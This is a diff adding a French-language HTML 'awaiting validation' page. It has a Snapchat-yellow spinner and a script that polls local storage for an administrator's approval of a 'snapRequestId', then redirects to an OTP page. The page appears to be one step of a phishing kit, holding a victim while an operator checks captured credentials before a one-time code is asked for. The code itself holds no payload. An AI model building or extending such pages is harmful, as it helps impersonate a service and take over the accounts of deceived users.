@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>En attente de validation</title>
+  <link rel="stylesheet" href="style.css">
+  <style>
+    .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #fffc00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>⏳ En attente de validation</h2>
+    <p>Votre demande est en cours de validation par un administrateur.</p>
+    <div class="spinner"></div>
+    <p id="status">Veuillez patienter...</p>
+  </div>
+
+  <script>
+    const requestId = sessionStorage.getItem('snapRequestId');
+    const statusEl = document.getElementById('status');
+    let attempts = 0;
+    const maxAttempts = 60; // Vérifie pendant 60 secondes (60 * 1000ms)
+
+    const checkValidation = () => {
+      if (localStorage.getItem(`validated_${requestId}`) === 'true') {
+        // La validation a été faite, on redirige
+        console.log("Demande validée ! Redirection vers OTP...");
+        window.location.href = 'otp.html';
+      } else {
+        attempts++;
+        if (attempts < maxAttempts) {
+          // Pas encore validé, on recommence dans 1 seconde
+          setTimeout(checkValidation, 1000);
+        } else {
+          // Timeout
+          statusEl.textContent = "La validation a expiré. Veuillez réessayer.";
+          statusEl.style.color = 'red';
+        }
+      }
+    };
+
+    if (requestId) {
+      checkValidation();
+    } else {
+      statusEl.textContent = "Erreur : aucune demande en cours.";
+      statusEl.style.color = 'red';
+    }
+  </script>
+</body>
+</html>
